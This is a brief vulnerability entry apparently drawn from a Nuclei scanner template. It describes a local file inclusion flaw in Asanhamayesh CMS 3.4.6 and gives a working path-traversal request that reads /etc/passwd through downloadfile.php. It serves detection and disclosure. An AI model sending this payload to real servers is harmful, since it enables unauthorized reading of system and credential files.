# Vulnerability: Asanhamayesh CMS 3.4.6 - Local File Inclusion
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`asanhamayesh-lfi.yaml`)

## Description
Asanhamayesh CMS 3.4.6 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/downloadfile.php?file=../../../../../../../../../../etc/passwd
```

